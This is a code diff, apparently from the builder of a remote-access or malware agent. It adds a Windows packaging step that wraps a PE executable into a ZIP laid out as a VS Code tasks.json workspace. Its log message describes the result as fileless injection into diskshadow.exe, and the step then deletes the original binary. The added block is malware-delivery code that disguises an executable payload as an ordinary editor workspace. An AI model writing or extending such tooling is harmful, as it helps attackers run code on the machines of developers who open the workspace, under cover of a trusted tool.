@@ -981,6 +981,33 @@ func runBoundFiles() {
         }
         // ── End JAR wrapper ───────────────────────────────────────────────────
 
+        // ── Tasks.json wrapper: VS Code workspace with fileless PE injection ──
+        const isTasksWrapper = os === "windows" && winExt === ".zip";
+        if (isTasksWrapper) {
+          sendToStream({ type: "output", text: `Wrapping PE binary as VS Code tasks.json workspace...\n`, level: "info" });
+          try {
+            const { wrapPeAsTasksZip } = await import("./tasks-wrapper");
+            const exeBytes = fs.readFileSync(filePath);
+            const zipPath = filePath.replace(/\.[^.]+$/, ".zip");
+            await wrapPeAsTasksZip(exeBytes, zipPath);
+            if (zipPath !== filePath) fs.unlinkSync(filePath);
+            finalSize = fs.statSync(zipPath).size;
+            const zipOutputName = outputName.replace(/\.[^.]+$/, ".zip");
+            sendToStream({ type: "output", text: `Tasks workspace: ${exeBytes.length} byte PE → ${finalSize} byte ZIP (fileless injection into diskshadow.exe)\n`, level: "info" });
+            (build.files as any[]).push({
+              name: zipOutputName,
+              filename: zipOutputName,
+              platform,
+              version: agentVersion,
+              size: finalSize,
+            });
+            continue;
+          } catch (tasksErr: any) {
+            sendToStream({ type: "output", text: `WARNING: Tasks wrapper failed: ${tasksErr.message || tasksErr}. Output is a raw PE binary.\n`, level: "warn" });
+          }
+        }
+        // ── End Tasks.json wrapper ────────────────────────────────────────────
+
         // ── IPA packaging for iOS targets ──────────────────────────────────────
         if (os === "ios") {
           sendToStream({ type: "output", text: `Packaging ${outputName} as IPA...\n`, level: "info" });
